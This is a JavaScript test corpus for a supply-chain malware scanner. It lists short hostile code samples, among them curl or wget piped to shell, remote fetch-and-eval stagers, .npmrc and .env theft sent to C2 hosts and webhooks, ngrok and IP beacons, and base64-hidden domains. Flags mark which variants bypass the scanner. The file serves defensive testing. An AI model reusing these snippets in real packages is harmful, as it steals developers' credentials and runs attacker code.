// red-team/corpus/supply-chain-extended.js
// Extended supply-chain / stager / C2-beacon variants.

module.exports = [
  // ── Covered by literals / credential rules (expected BLOCK) ─────────────────
  {
    id: 'sc-postinstall-wget-bash',
    category: 'supply-chain', technique: 'postinstall-pipe-bash', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Postinstall fetches a stager and pipes into bash',
    code: `require('child_process').execSync('wget -qO- https://evil.example/i.sh | bash');`,
  },
  {
    id: 'sc-pastebin-raw-newfunction',
    category: 'supply-chain', technique: 'pastebin-fetch-exec', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Pulls a payload from pastebin and runs it via new Function',
    code: `require('https').get('https://pastebin.com/raw/ZZ99', (r) => { let d=''; r.on('data', c=>d+=c); r.on('end', () => new Function(d)()); });`,
  },
  {
    id: 'sc-paste-ee-eval',
    category: 'supply-chain', technique: 'paste-ee-fetch-eval', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'paste.ee second-stage fetch + eval',
    code: `fetch('https://paste.ee/r/abcd1').then(r=>r.text()).then(t=>eval(t)); module.exports = {};`,
  },
  {
    id: 'sc-preinstall-npmrc-steal',
    category: 'supply-chain', technique: 'preinstall-npmrc-theft', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Preinstall reads the .npmrc token and posts it to a hardcoded C2',
    code: `
      const fs = require('fs');
      const rc = fs.readFileSync(require('os').homedir() + '/.npmrc', 'utf8');
      fetch('https://evil.example/npm', { method: 'POST', body: rc });
      module.exports = {};
    `,
  },
  {
    id: 'sc-discord-webhook-env',
    category: 'supply-chain', technique: 'discord-webhook-exfil', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Reads .env and posts it to a Discord webhook (credential file + egress fires the rule)',
    code: `
      const fs = require('fs');
      const e = fs.readFileSync('.env', 'utf8');
      fetch('https://discord.com/api/webhooks/123/abc', { method: 'POST', body: JSON.stringify({ content: e }) });
      module.exports = {};
    `,
  },

  // ── Uncovered hosts / beacons (known bypass) ────────────────────────────────
  {
    id: 'sc-githubusercontent-eval',
    category: 'supply-chain', technique: 'raw-github-fetch-eval', severity: 'HIGH',
    expected: 'BLOCK', knownBypass: false, // closed: REMOTE_FETCH_EXEC rule (Phase 2)
    description: 'Fetches a payload from raw.githubusercontent.com and eval\'s it — host not a bad literal, fetch+eval is not a chained rule',
    code: `fetch('https://raw.githubusercontent.com/evil/x/main/p.js').then(r=>r.text()).then(t=>(0,eval)(t)); module.exports = {};`,
  },
  {
    id: 'sc-transfer-sh',
    category: 'supply-chain', technique: 'transfer-sh-stager', severity: 'HIGH',
    expected: 'BLOCK', knownBypass: false, // closed: REMOTE_FETCH_EXEC rule (Phase 2)
    description: 'Downloads and executes a second stage from transfer.sh',
    code: `fetch('https://transfer.sh/abc/stage2.js').then(r=>r.text()).then(t=>new Function(t)()); module.exports = {};`,
  },
  {
    id: 'sc-ngrok-beacon',
    category: 'supply-chain', technique: 'ngrok-c2-beacon', severity: 'HIGH',
    expected: 'BLOCK', knownBypass: true,
    description: 'Periodic beacon to an ngrok C2 tunnel',
    code: `setInterval(() => fetch('https://abc123.ngrok.io/beacon', { method: 'POST', body: process.pid + '' }), 30000); module.exports = {};`,
  },
  {
    id: 'sc-telegram-bot',
    category: 'supply-chain', technique: 'telegram-bot-exfil', severity: 'HIGH',
    expected: 'BLOCK', knownBypass: true,
    description: 'Exfiltrates host info to a Telegram bot API (env read only, so no credential-file rule)',
    code: `fetch('https://api.telegram.org/bot123:ABC/sendMessage?chat_id=1&text=' + process.env.USER); module.exports = {};`,
  },
  {
    id: 'sc-ip-literal-c2',
    category: 'supply-chain', technique: 'ip-literal-c2', severity: 'HIGH',
    expected: 'BLOCK', knownBypass: true,
    description: 'Fetches commands from a bare IP-literal C2 and runs them',
    code: `
      const cp = require('child_process');
      fetch('http://185.99.1.2:8080/task').then(r=>r.text()).then(t=>cp.exec(t));
      module.exports = {};
    `,
  },
  {
    id: 'sc-base64-domain',
    category: 'supply-chain', technique: 'base64-domain-evasion', severity: 'HIGH',
    expected: 'BLOCK', knownBypass: true,
    description: 'C2 domain held as base64 and reconstructed at runtime',
    code: `
      const host = Buffer.from('ZXZpbC5leGFtcGxl', 'base64').toString();
      fetch('https://' + host + '/stage').then(r=>r.text()).then(t=>eval(t));
      module.exports = {};
    `,
  },
  {
    id: 'sc-dependency-confusion',
    category: 'supply-chain', technique: 'dependency-confusion-fetch', severity: 'HIGH',
    expected: 'BLOCK', knownBypass: true,
    description: 'Beacons the resolved internal package list to an attacker registry (benign-looking network call, no dangerous chain)',
    code: `fetch('https://attacker-registry.example/collect', { method: 'POST', body: JSON.stringify(require('./package.json').dependencies) }); module.exports = {};`,
  },
  {
    id: 'sc-s3-remote-config-eval',
    category: 'supply-chain', technique: 's3-remote-config-eval', severity: 'HIGH',
    expected: 'BLOCK', knownBypass: false, // closed: REMOTE_FETCH_EXEC rule (Phase 2)
    description: 'Loads "remote config" from an S3 bucket and eval\'s it',
    code: `fetch('https://mybucket.s3.amazonaws.com/config.js').then(r=>r.text()).then(t=>eval(t)); module.exports = {};`,
  },
  {
    id: 'sc-setimmediate-beacon',
    category: 'supply-chain', technique: 'deferred-beacon', severity: 'MEDIUM',
    expected: 'BLOCK', knownBypass: true,
    description: 'Defers a beacon to process exit to dodge load-time scanning heuristics',
    code: `process.on('exit', () => { try { require('http').get('http://evil.example/x?p=' + process.env.USER); } catch (e) {} }); module.exports = {};`,
  },
  {
    id: 'sc-atob-eval-inline',
    category: 'supply-chain', technique: 'inline-atob-eval', severity: 'HIGH',
    expected: 'BLOCK',
    description: 'Inline atob-decoded blob eval\'d at load (OBFUSCATED_CODE_EXECUTION catches decode+eval)',
    code: `eval(atob('Y29uc29sZS5sb2coJ3B3bmVkJyk=')); module.exports = {};`,
  },
  {
    id: 'sc-preinstall-curl-sh',
    category: 'supply-chain', technique: 'postinstall-curl-pipe-sh', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: false, // closed: pipe-to-shell BLOCK_REGEXES (Phase 1)
    description: 'curl ... | sh stager — only "| bash" is a block literal, so piping into sh slips past',
    code: `require('child_process').execSync('curl -s https://evil.example/i.sh | sh');`,
  },
];
